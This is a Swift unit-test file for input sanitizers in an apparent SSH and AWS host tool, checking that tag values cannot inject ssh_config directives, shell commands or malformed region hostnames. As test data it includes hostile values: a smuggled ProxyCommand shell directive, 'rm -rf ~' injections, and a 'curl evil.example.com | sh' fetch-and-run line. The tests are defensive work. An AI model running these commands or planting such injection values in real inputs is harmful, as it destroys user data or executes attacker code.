import XCTest
@testable import HangarCore

/// The guards that stand between untrusted tag values and ssh, the shell, and
/// AWS endpoint hostnames.
final class SanitizeTests: XCTestCase {

    // MARK: - ssh_config values

    func testOrdinaryValuesAreEmittable() {
        XCTAssertTrue(SSHConfigValue.isEmittable("web.prod.example.com"))
        XCTAssertTrue(SSHConfigValue.isEmittable("web 1"), "a space is legal in a tag")
    }

    func testNewlineBearingValuesAreRefused() {
        // The attack this exists for: a second directive smuggled into a tag.
        XCTAssertFalse(SSHConfigValue.isEmittable("ok\n  ProxyCommand /bin/sh -c evil"))
        XCTAssertFalse(SSHConfigValue.isEmittable("ok\r  ProxyCommand x"))
        XCTAssertFalse(SSHConfigValue.isEmittable("ok\u{0}x"))
    }

    func testDoubleQuoteIsRefused() {
        // ssh_config offers no way to escape a quote inside a quoted argument.
        XCTAssertFalse(SSHConfigValue.isEmittable("we\"ird"))
    }

    func testEmptyIsNotEmittable() {
        XCTAssertFalse(SSHConfigValue.isEmittable(""))
    }

    func testQuotingOnlyWhereItIsNeeded() {
        XCTAssertEqual(SSHConfigValue.quoted("web.example.com"), "web.example.com")
        XCTAssertEqual(SSHConfigValue.quoted("web 1"), "\"web 1\"")
        XCTAssertEqual(SSHConfigValue.quoted("~/my key.pem"), "\"~/my key.pem\"")
    }

    func testCommentValuesAreFlattened() {
        XCTAssertEqual(SSHConfigValue.comment("a\nb"), "a b")
    }

    // MARK: - Shell

    func testShellQuoting() {
        XCTAssertEqual(Shell.quoted("web-1"), "'web-1'")
        XCTAssertEqual(Shell.quoted("a b"), "'a b'")
        XCTAssertEqual(Shell.quoted("it's"), "'it'\\''s'")
    }

    func testShellQuotingNeutralisesMetacharacters() {
        let quoted = Shell.quoted("host; rm -rf ~")
        XCTAssertEqual(quoted, "'host; rm -rf ~'")
        XCTAssertFalse(quoted.dropFirst().dropLast().contains("'"),
                       "the payload must stay inside one quoted word")
    }

    func testSingleLineDetection() {
        XCTAssertTrue(Shell.isSingleLine("ssh web-1"))
        XCTAssertFalse(Shell.isSingleLine("ssh web-1\nrm -rf ~"))
    }

    // MARK: - Regions

    func testValidRegions() {
        XCTAssertTrue(AWSRegion.isValid("us-west-2"))
        XCTAssertTrue(AWSRegion.isValid("ap-southeast-4"))
        XCTAssertTrue(AWSRegion.isValid("us-gov-east-1"))
    }

    func testInvalidRegionsAreRejectedRatherThanCrashing() {
        // Each of these produced a nil URL and a force-unwrap trap before.
        XCTAssertFalse(AWSRegion.isValid("us west 2"))
        XCTAssertFalse(AWSRegion.isValid("us_west|2"))
        XCTAssertFalse(AWSRegion.isValid(""))
        XCTAssertFalse(AWSRegion.isValid("US-WEST-2"))
    }

    func testEndpointBuilding() throws {
        let url = try AWSRegion.endpoint(service: "ec2", region: "us-west-2")
        XCTAssertEqual(url.absoluteString, "https://ec2.us-west-2.amazonaws.com/")
        let oidc = try AWSRegion.endpoint(service: "oidc", region: "eu-west-1",
                                          path: "/token")
        XCTAssertEqual(oidc.absoluteString, "https://oidc.eu-west-1.amazonaws.com/token")
    }

    func testEndpointThrowsOnAMalformedRegion() {
        XCTAssertThrowsError(try AWSRegion.endpoint(service: "ec2", region: "us west 2")) {
            XCTAssertTrue($0.localizedDescription.contains("not a valid AWS region"),
                          $0.localizedDescription)
        }
    }

    // MARK: - The ssh command line

    func testManagedHostNeedsNoFlags() {
        XCTAssertEqual(
            SSHCommand.line(target: "payments-prod-web-1", user: "rocky",
                            identityFile: "~/k.pem", managedByConfig: true),
            "ssh 'payments-prod-web-1'")
    }

    func testUnmanagedHostSpellsOutUserAndKey() {
        XCTAssertEqual(
            SSHCommand.line(target: "web.example.com", user: "rocky",
                            identityFile: "~/k.pem", managedByConfig: false),
            "ssh -i '~/k.pem' 'rocky@web.example.com'")
    }

    func testAHostileHostnameTagCannotEscapeIntoTheShell() {
        let line = SSHCommand.line(target: "web.example.com; curl evil.example.com | sh",
                                   user: nil, identityFile: nil, managedByConfig: false)
        XCTAssertEqual(line, "ssh 'web.example.com; curl evil.example.com | sh'")
    }
}
